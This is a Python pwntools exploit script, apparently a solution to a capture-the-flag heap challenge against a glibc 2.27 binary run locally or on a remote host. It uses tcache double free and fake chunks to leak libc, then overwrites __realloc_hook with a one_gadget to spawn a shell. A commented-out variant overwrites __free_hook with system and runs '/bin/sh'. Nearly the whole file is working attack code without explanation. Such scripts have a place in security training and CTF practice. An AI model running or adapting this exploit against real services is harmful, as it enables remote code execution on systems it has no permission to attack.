#!/usr/bin/env python2

from pwn import *
from qpwn import *
from sys import argv
context(binary='./pwn', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote(argv[1], int(argv[2]))
    libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    libc = ELF('./libc-2.27.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

def menu(index):
    p.sla('Your choice :', str(index))

def create(size, content):
    menu(1)
    p.sla('Size:', str(size))
    p.sa('Data:', content)

def delete():
    menu(2)

def show():
    menu(3)

if __name__ == '__main__':
    p.sa('Name:', flat(0x0, 0x801))
    create(0x48, 'a')
    delete()
    delete()
    name_addr = 0x0000000000602060
    create(0x48, flat(name_addr + 0x800))
    create(0x48, 'a')
    create(0x48, flat(0x0, 0x21, 0x0, 0x0, 0x0, 0x21))
    create(0x38, 'a')
    delete()
    delete()
    create(0x38, flat(name_addr + 0x10))
    create(0x38, 'a')
    create(0x38, 'a')
    delete()
    show()
    libc.address = u64(p.ru('\x7f')[-6:].ljust(8, '\x00')) - 0x7ffff7dd2ca0 + 0x00007ffff79e7000
    success('libc ' + hex(libc.address))
    create(0x28, 'a')
    delete()
    delete()
    create(0x28, flat(libc.sym['__realloc_hook']))
    create(0x28, 'a')
    one_gadget = libc.address + 0x10a38c
    create(0x28, flat(one_gadget, libc.sym['realloc']+6))
    menu(1)
    bc(one_gadget, libc.sym['realloc'])
    p.sla('Size:', str(0x18))
    #create(0x18, '/bin/sh\x00')
    #gogogo('heap bins')
    p.i()
    '''
    p.sa('Name:', '\x00' * 0x10)
    create(0x38, 'a')
    delete()
    delete()
    create(0x38, flat(0x0000000000602020))
    create(0x38, 'a')
    create(0x38, '\x60')
    create(0x38, flat(0xfbad1880, 0x0, 0x0, 0x0, '\x00'))
    leak = u64(p.ru('\x7f')[-6:].ljust(8, '\x00'))
    success('leak ' + hex(leak))
    libc.address = leak - 0x7ffff7dd48b0 + 0x00007ffff79e7000
    #gogogo('vmmap')
    create(0x28, 'a')
    delete()
    delete()
    create(0x28, flat(libc.sym['__free_hook']))
    create(0x28, 'a')
    create(0x28, flat(libc.sym['system']))
    create(0x18, '/bin/sh\x00')
    delete()
    #gogogo('heap bins')
    p.i()
    '''
